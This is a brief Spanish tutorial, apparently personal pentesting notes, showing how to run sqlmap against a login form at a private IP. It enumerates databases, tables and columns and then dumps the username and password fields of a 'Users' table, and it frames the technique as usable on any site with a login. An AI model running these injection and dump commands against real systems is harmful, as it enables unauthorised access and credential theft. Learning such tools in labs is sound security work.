Siempre que veamos un login en alguna página se puede tratar de usar la siguiente herramienta la cual nos permitirá hacer un mapeo de la base de datos que pueda estar detrás de la página.

En primer lugar tendremos que saber el nombre de la base de datos por lo que usaremos el comando `--dbs`. 
````
sqlmap -u http://192.168.1.148/administrator/ --forms --dbs --batch
`````

El comando hace los siguiente:
- `-u`: Especifica la dirección web que se va a analizar en busca de vulnerabilidades.
- `--forms`: Le indica a sqlmap que busque formularios en la página web y los pruebe para detectar inyecciones SQL.
- `--dbs`: Si se detecta una vulnerabilidad, esta opción intenta listar todas las bases de datos disponibles en el servidor.
- `--batch`: Ejecuta el comando sin pedir confirmaciones al usuario. Ideal para automatizar pruebas sin intervención manual.

 Una vez nos devuelva resultados hay que tener en cuenta que por defecto suelen salir algunas bases de datos, los nombres son:
- "information_schema"
- "mysql"
- "performance_schema"

Una vez teniendo la base de datos tendremos que añadir el `-D` indicándole la base de datos encontrada y el `--tables` con tal de saber que tablas contiene la base.

````
sqlmap -u http://192.168.1.148/administrator/ --forms -D Webapp --tables --batch
`````

Teniendo las tablas tendremos que ir revisándolas, esta vez añadiremos el `-T` con la tabla encontrada y el `--columns`  ya que queremos encontrar las columnas de la tabla.

````
sqlmap -u http://192.168.1.148/administrator/ --forms -D Webapp -T Users --columns --batch
`````

Por ultimo, teniendo las columnas, añadiremos el comando `-C` con los nombres de las columnas que nos interesen y el `--dumnp` porque queremos que nos devuelva los resultados que hay dentro de estas.

````
sqlmap -u http://192.168.1.148/administrator/ --forms -D Webapp -T Users -C username,password --dump --batch
`````


